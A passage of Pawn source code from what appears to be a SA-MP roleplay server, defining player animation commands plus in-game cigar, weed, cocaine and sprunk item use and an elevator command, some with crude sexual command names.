		case 3: LoopingAnim(playerid,"RAPPING","RAP_C_Loop",4.0,1,1,1,1,0);
	}
	return 1;
}

IRP:reload(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /reload [1-5]");
	if(animid < 1 || animid > 5) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /reload [1-5]");
	switch(animid)
	{
		case 1: ApplyAnimation(playerid,"COLT45","colt45_reload", 4.0, 0, 0, 0, 0, 0);
		case 2: ApplyAnimation(playerid,"COLT45","sawnoff_reload", 4.0, 0, 0, 0, 0, 0);
		case 3: ApplyAnimation(playerid,"BUDDY","buddy_reload", 4.0, 0, 0, 0, 0, 0);
		case 4: ApplyAnimation(playerid,"RIFLE","RIFLE_load", 4.0, 0, 0, 0, 0, 0);
		case 5: ApplyAnimation(playerid,"PYTHON","python_reload", 4.0, 0, 0, 0, 0, 0);
	}
	return 1;
}

IRP:dj(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dj [1-4]");
	if(animid < 1 || animid > 4) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dj [1-4]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"SCRATCHING","scdldlp",4.0,1,0,0,0,0);
		case 2: LoopingAnim(playerid,"SCRATCHING","scdlulp",4.0,1,0,0,0,0);
		case 3: LoopingAnim(playerid,"SCRATCHING","scdrdlp",4.0,1,0,0,0,0);
		case 4: LoopingAnim(playerid,"SCRATCHING","scdrulp",4.0,1,0,0,0,0);
	}
	return 1;
}
IRP:shakehand(playerid, var[])
{
	new string[128], user, style;
	if(sscanf(var, "ud", user, style)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /shakehand [playerid] [1-8]");

	if(Logged(user))
	{
		if(user == playerid)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You can't shake your own hand.");
			return 1;
		}
		if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
    	{
    	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
    	    return 1;
    	}
    	if(IsPlayerCuffed(user) ||  IsPlayerInAnyVehicle(user) || IsPlayerTied(user) || Player[user][pDead])
    	{
    	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
    	    return 1;
    	}
		if(style >= 1 && style < 9)
		{
			new Float: ppFloats[3];

			GetPlayerPos(user, ppFloats[0], ppFloats[1], ppFloats[2]);

			if(!IsPlayerInRangeOfPoint(playerid, 5, ppFloats[0], ppFloats[1], ppFloats[2]))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You're too far away. You can't shake hands right now.");
				return 1;
			}

			ShakeHandRequest[user] = playerid;
			ShakeHandStyle[user] = style;

			format(string, sizeof(string), "* You have requested to shake %s's hand, please wait for them to respond.", GetName(user));
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s has requested to shake your hand, please use '/accept handshake' to approve the hand shake.", GetName(playerid));
			SendClientMessage(user, COLOR_LIGHTBLUE, string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /shakehand [playerid] [1-8]");
		}
	}
	else
	{
		NoLoginB(playerid);
	}
	return 1;
}
IRP:skate(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /skate [1-3]");
	if(animid < 1 || animid > 3) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /skate [1-3]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"SKATE","skate_idle", 4.0, 1, 1, 1, 1, 1);
		case 2: LoopingAnim(playerid,"SKATE","skate_run", 4.0, 1, 1, 1, 1, 1);
		case 3: LoopingAnim(playerid,"SKATE","skate_sprint", 4.0, 1, 1, 1, 1, 1);
	}
	return 1;
}

IRP:wank(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /wank [1-3]");
	if(animid < 1 || animid > 3) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /wank [1-3]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"PAULNMAC","wank_in",4.0,1,1,1,1,0);
		case 2: LoopingAnim(playerid,"PAULNMAC","wank_loop",4.0,1,1,1,1,0);
		case 3: OnePlayAnim(playerid,"PAULNMAC","wank_out",4.0,0,0,0,0,0);
	}
	return 1;
}

IRP:fuckme(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fuckme [1-8]");
	if(animid < 1 || animid > 8) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fuckme [1-8]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"SNM","SPANKING_IDLEW",4.1,0,1,1,1,0);
		case 2: LoopingAnim(playerid,"SNM","SPANKING_IDLEP",4.1,0,1,1,1,0);
		case 3: LoopingAnim(playerid,"SNM","SPANKINGW",4.1,0,1,1,1,0);
		case 4: LoopingAnim(playerid,"SNM","SPANKINGP",4.1,0,1,1,1,0);
		case 5: LoopingAnim(playerid,"SNM","SPANKEDW",4.1,0,1,1,1,0);
		case 6: LoopingAnim(playerid,"SNM","SPANKEDP",4.1,0,1,1,1,0);
		case 7: LoopingAnim(playerid,"SNM","SPANKING_ENDW",4.1,0,1,1,1,0);
		case 8: LoopingAnim(playerid,"SNM","SPANKING_ENDP",4.1,0,1,1,1,0);
	}
	return 1;
}

IRP:bj(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /bj [1-12]");
	if(animid < 1 || animid > 12) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /bj [1-12]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"BLOWJOBZ","BJ_COUCH_START_P",4.1,0,1,1,1,0);
		case 2: LoopingAnim(playerid,"BLOWJOBZ","BJ_COUCH_START_W",4.1,0,1,1,1,0);
		case 3: LoopingAnim(playerid,"BLOWJOBZ","BJ_COUCH_LOOP_P",4.1,0,1,1,1,0);
		case 4: LoopingAnim(playerid,"BLOWJOBZ","BJ_COUCH_LOOP_W",4.1,0,1,1,1,0);
		case 5: LoopingAnim(playerid,"BLOWJOBZ","BJ_COUCH_END_P",4.1,0,1,1,1,0);
		case 6: LoopingAnim(playerid,"BLOWJOBZ","BJ_COUCH_END_W",4.1,0,1,1,1,0);
		case 7: LoopingAnim(playerid,"BLOWJOBZ","BJ_STAND_START_P",4.1,0,1,1,1,0);
		case 8: LoopingAnim(playerid,"BLOWJOBZ","BJ_STAND_START_W",4.1,0,1,1,1,0);
		case 9: LoopingAnim(playerid,"BLOWJOBZ","BJ_STAND_LOOP_P",4.1,0,1,1,1,0);
		case 10: LoopingAnim(playerid,"BLOWJOBZ","BJ_STAND_LOOP_W",4.1,0,1,1,1,0);
		case 11: LoopingAnim(playerid,"BLOWJOBZ","BJ_STAND_END_P",4.1,0,1,1,1,0);
		case 12: LoopingAnim(playerid,"BLOWJOBZ","BJ_STAND_END_W",4.1,0,1,1,1,0);
	}
	return 1;
}

IRP:signal(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /signal [1-2]");
	if(animid < 1 || animid > 2) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /signal [1-2]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"POLICE","CopTraf_Come",4.0,0,0,0,0,0);
		case 2: LoopingAnim(playerid,"POLICE","CopTraf_Stop",4.0,0,0,0,0,0);
	}
	return 1;
}

IRP:lean(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /lean [1-2]");
	if(animid < 1 || animid > 2) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /lean [1-2]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"GANGS","leanIDLE",4.1,0,0,0,1,0);
		case 2: LoopingAnim(playerid,"MISC","Plyrlean_loop",4.1,0,0,0,1,0);
	}
	return 1;
}

IRP:sleep(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sleep [1-2]");
	if(animid < 1 || animid > 2) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sleep [1-2]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"crack","crckdeth4",4.0,0,0,0,1,0);
		case 2: LoopingAnim(playerid,"crack","crckidle2",4.0,0,0,0,1,0);
	}
	return 1;
}

IRP:fallover(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fallover [1-4]");
	if(animid < 1 || animid > 4) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fallover [1-4]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"KNIFE","KILL_Knife_Ped_Die",4.0,0,1,1,1,0);
		case 2: LoopingAnim(playerid,"PED","KO_shot_face",4.0,0,1,1,1,0);
		case 3: LoopingAnim(playerid,"PED","KO_shot_stom",4.0,0,1,1,1,0);
		case 4: LoopingAnim(playerid, "PED", "BIKE_fallR", 4.0, 0, 1, 1, 0, 0);
	}
	return 1;
}

IRP:wave(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /wave [1-3]");
	if(animid < 1 || animid > 3) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /wave [1-3]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"ON_LOOKERS","wave_loop",4.0,1,0,0,0,0);
		case 2: OnePlayAnim(playerid,"KISSING","gfwave2",4.0,0,0,0,0,0);
		case 3: OnePlayAnim(playerid,"PED","endchat_03",4.0,0,0,0,0,0);
	}
	return 1;
}

IRP:cheer(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /cheer [1-8]");
	if(animid < 1 || animid > 8) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /cheer [1-8]");
	switch(animid)
	{
		case 1: OnePlayAnim(playerid,"ON_LOOKERS","shout_01",4.0,0,0,0,0,0);
		case 2: OnePlayAnim(playerid,"ON_LOOKERS","shout_02",4.0,0,0,0,0,0);
		case 3: OnePlayAnim(playerid,"ON_LOOKERS","shout_in",4.0,0,0,0,0,0);
		case 4: LoopingAnim(playerid,"RIOT","RIOT_ANGRY_B",4.0,1,0,0,0,0);
		case 5: OnePlayAnim(playerid,"RIOT","RIOT_CHANT",4.0,0,0,0,0,0);
		case 6: OnePlayAnim(playerid,"RIOT","RIOT_shout",4.0,0,0,0,0,0);
		case 7: OnePlayAnim(playerid,"STRIP","PUN_HOLLER",4.0,0,0,0,0,0);
		case 8: OnePlayAnim(playerid,"OTB","wtchrace_win",4.0,0,0,0,0,0);
	}
	return 1;
}

IRP:deal(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deal [1-2]");
	if(animid < 1 || animid > 2) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deal [1-2]");
	switch(animid)
	{
		case 1: OnePlayAnim(playerid,"DEALER", "DEALER_DEAL",4.0,0,0,0,0,0);
		case 2: OnePlayAnim(playerid,"DEALER","shop_pay",4.0,0,0,0,0,0);
	}
	return 1;
}

IRP:chat(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /chat [1-7]");
	if(animid < 1 || animid > 7) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /chat [1-7]");
	switch(animid)
	{
		case 1: OnePlayAnim(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
		case 2: OnePlayAnim(playerid,"GANGS","prtial_gngtlkA",4.0,0,0,0,0,0);
		case 3: OnePlayAnim(playerid,"GANGS","prtial_gngtlkB",4.0,0,0,0,0,0);
		case 4: OnePlayAnim(playerid,"GANGS","prtial_gngtlkE",4.0,0,0,0,0,0);
		case 5: OnePlayAnim(playerid,"GANGS","prtial_gngtlkF",4.0,0,0,0,0,0);
		case 6: OnePlayAnim(playerid,"GANGS","prtial_gngtlkG",4.0,0,0,0,0,0);
		case 7: OnePlayAnim(playerid,"GANGS","prtial_gngtlkH",4.0,0,0,0,0,0);
	}
	return 1;
}

IRP:gesture(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gesture [1-15]");
	if(animid < 1 || animid > 15) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gesture [1-15]");
	switch(animid)
	{
		case 1: OnePlayAnim(playerid,"GHANDS","gsign1",4.0,0,0,0,0,0);
		case 2: OnePlayAnim(playerid,"GHANDS","gsign1LH",4.0,0,0,0,0,0);
		case 3: OnePlayAnim(playerid,"GHANDS","gsign2",4.0,0,0,0,0,0);
		case 4: OnePlayAnim(playerid,"GHANDS","gsign2LH",4.0,0,0,0,0,0);
		case 5: OnePlayAnim(playerid,"GHANDS","gsign3",4.0,0,0,0,0,0);
		case 6: OnePlayAnim(playerid,"GHANDS","gsign3LH",4.0,0,0,0,0,0);
		case 7: OnePlayAnim(playerid,"GHANDS","gsign4",4.0,0,0,0,0,0);
		case 8: OnePlayAnim(playerid,"GHANDS","gsign4LH",4.0,0,0,0,0,0);
		case 9: OnePlayAnim(playerid,"GHANDS","gsign5",4.0,0,0,0,0,0);
		case 10: OnePlayAnim(playerid,"GHANDS","gsign5",4.0,0,0,0,0,0);
		case 11: OnePlayAnim(playerid,"GHANDS","gsign5LH",4.0,0,0,0,0,0);
		case 12: OnePlayAnim(playerid,"GANGS","Invite_No",4.0,0,0,0,0,0);
		case 13: OnePlayAnim(playerid,"GANGS","Invite_Yes",4.0,0,0,0,0,0);
		case 14: OnePlayAnim(playerid,"GANGS","prtial_gngtlkD",4.0,0,0,0,0,0);
		case 15: OnePlayAnim(playerid,"GANGS","smkcig_prtl",4.0,0,0,0,0,0);
	}
	return 1;
}

IRP:use(playerid, var[])
{
	new string[128];
	if(Event[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You cant do that while you are in event.");
	if(IsPlayerCuffed(playerid) && IsPlayerTied(playerid) && IsDead[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	if(sscanf(var, "s[8]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /use [type]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [TYPES]: Cigar | Weed | Cocaine");
		return 1;
	}
	if(!strcmp(var, "cigar", true))
	{
	    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
		if(!Player[playerid][pCigar]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have any cigars on you.");
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
		Player[playerid][pCigar] --;
		format(string, sizeof(string), "* %s takes out a cuban cigar and lights it up.", GetName(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else if(!strcmp(var, "weed", true))
	{
	    //if(GetPlayerDrunkLevel(playerid) >= 5000) return SendClientMessage(playerid, COLOR_GRAD2, "You are too drunk/stoned to use drugs.");
    	if(Player[playerid][pStoned] >= 5) return SendClientMessage(playerid, COLOR_GRAD2, "You are too stoned to use drugs.");
	    new Float:H;
	    if(!Player[playerid][pWeed]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have any Weed on you.");
	    if(DrugTimeout[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, " You can't use drugs at the moment.");
	    GetPlayerHealth(playerid, H);
	    if(H >= 100) return SendClientMessage(playerid, COLOR_GRAD2, "You have full health already.");
	    //Animation
	    if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"SMOKING","M_smkstnd_loop",8,0,0,0,0,0,1);
		else ApplyAnimation(playerid,"ped","Smoke_in_car",2.1,0,0,0,0,0,1);
		// Effects
		if(DayUnbreakable == 1)
		{
    	    SetPlayerHealth(playerid, H+10);
    	    GetPlayerHealth(playerid, H);
    	    if(H > 150) SetPlayerHealth(playerid, 150);
    	}
    	else
    	{
            SetPlayerHealth(playerid, H+10);
    	    GetPlayerHealth(playerid, H);
    	    if(H > 100) SetPlayerHealth(playerid, 100);
    	}
	    Player[playerid][pWeed] --;
	    Player[playerid][pStoned] ++;
		format(string, sizeof(string), "* %s takes out a joint and smokes it.", GetName(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		DrugTimeout[playerid] = 5;
		SetTimerEx("DrugTimer", 5000, false, "i", playerid);
		/*if(GetPlayerDrunkLevel(playerid) >= 5000)
		{
			SetPlayerWeather(playerid, -66);
			SetTimerEx("Stoned", 8000, false, "i", playerid);
		}*/
		if(Player[playerid][pStoned] >= 3)
		{
			SetPlayerWeather(playerid, -66);
			KillTimer(StonedTimer[playerid]);
			StonedTimer[playerid] = SetTimerEx("Stoned", 30000, false, "i", playerid);
		}
		if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"SMOKING","M_smkstnd_loop",8,0,0,0,0,0,1);
		else ApplyAnimation(playerid,"ped","Smoke_in_car",2.1,0,0,0,0,0,1);
	}
	else if(!strcmp(var, "cocaine", true))
	{
    	if(Player[playerid][pStoned] >= 5) return SendClientMessage(playerid, COLOR_GRAD2, "You are too stoned to use drugs.");
	    new Float:A;
	    if(!Player[playerid][pCocaine]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have any cocaine on you.");
	    if(DrugTimeout[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, " You can't use drugs at the moment.");
	    GetPlayerArmour(playerid, A);
	    if(A >= 100) return SendClientMessage(playerid, COLOR_GRAD2, "You have full armor already.");
	    //Animation
	    if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"SMOKING","M_smkstnd_loop",2.1,0,0,0,0,0);
		else ApplyAnimation(playerid,"ped","Smoke_in_car",2.1,0,0,0,0,0);
	    // Effects
	    if(DayUnbreakable == 1)
		{
    	    SetPlayerArmour(playerid, A+10);
     	    GetPlayerArmour(playerid, A);
	        if(A > 150) SetPlayerArmour(playerid, 150);
    	}
    	else
    	{
            SetPlayerArmour(playerid, A+10);
	        GetPlayerArmour(playerid, A);
    	    if(A > 100) SetPlayerArmour(playerid, 100);
    	}
	    Player[playerid][pCocaine] --;
	    Player[playerid][pStoned] ++;
		format(string, sizeof(string), "* %s  snorts cocaine through a short metal tube, inhaling the cocaine into their nose to feel the effects.", GetName(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		DrugTimeout[playerid] = 5;
		SetTimerEx("DrugTimer", 5000, false, "i", playerid);
		if(Player[playerid][pStoned] >= 3)
		{
			SetPlayerWeather(playerid, -66);
			KillTimer(StonedTimer[playerid]);
			StonedTimer[playerid] = SetTimerEx("Stoned", 30000, false, "i", playerid);
		}
	}
	return 1;
}

IRP:elevator(playerid, var[])
{
	if(!IsFBI(playerid)) return NoAuth(playerid);
    new Float:pos[3];
    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
    if(pos[1] < -1301.4 && pos[1] > -1303.2417 && pos[0] < 1786.2131 && pos[0] > 1784.1555)    // He is using the elevator button
        ShowElevatorDialog(playerid);
    else    // Is he in a floor button?
	{
	    if(pos[1] > -1301.4 && pos[1] < -1299.1447 && pos[0] < 1785.6147 && pos[0] > 1781.9902)
	    {
	        // He is most likely using it, check floor:
			new i=20;
			while(pos[2] < GetDoorsZCoordForFloor(i) + 3.5 && i > 0)
			    i --;

			if(i == 0 && pos[2] < GetDoorsZCoordForFloor(0) + 2.0)
			    i = -1;

			if(i <= 19)
			{
				CallElevator(playerid, i + 1);
				SendClientMessage(playerid, COLOR_WHITE, "* You've successfully called the elevator.");
			}
	    }
	}
	return 1;
}

IRP:sprunk(playerid, var[])
{
	new string[128];
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(!Player[playerid][pSprunk]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have any sprunks on you.");
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_SPRUNK);
	Player[playerid][pSprunk] --;
	format(string, sizeof(string), "* %s takes out a sprunk can and opens it up.", GetName(playerid));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:hurt(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hurt [1-2]");
	if(animid < 1 || animid > 2) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hurt [1-2]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"SWAT","gnstwall_injurd",4.0,1,0,0,0,0);
		case 2: LoopingAnim(playerid,"SWEET","Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0);
	}
	return 1;
}

IRP:checktime(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	OnePlayAnim(playerid, "COP_AMBIENT", "Coplook_watch",4.0,0,0,0,0,0);
	return 1;
}

IRP:relax(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid, "cocaine", "crckidle1",4.0,0,1,1,1,-1);
	return 1;
}

IRP:dive(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid,"DODGE","Crush_Jump",4.0,0,1,1,1,0);
	return 1;
}

IRP:showoff(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	OnePlayAnim(playerid,"Freeweights","gym_free_celebrate",4.0,0,0,0,0,0);
	return 1;
}

IRP:crabs(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	OnePlayAnim(playerid,"MISC","Scratchballs_01",4.0,0,0,0,0,0);
	return 1;
}

IRP:salute(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	OnePlayAnim(playerid,"ON_LOOKERS","Pointup_loop",4.0,0,0,0,0,0);
	return 1;
}

IRP:stop(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	OnePlayAnim(playerid,"PED","endchat_01",4.0,0,0,0,0,0);
	return 1;
}

IRP:washhands(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	OnePlayAnim(playerid,"BD_FIRE","wash_up",4.0,0,0,0,0,0);
	return 1;
}

IRP:cry(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid,"GRAVEYARD","mrnF_loop",4.0,1,0,0,0,0);
	return 1;
}

IRP:what(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid,"RIOT","RIOT_ANGRY", 4.0, 0, 0, 0, 0, 0);
	return 1;
}

IRP:piss(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_PISSING);
	return 1;
}

IRP:followme(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
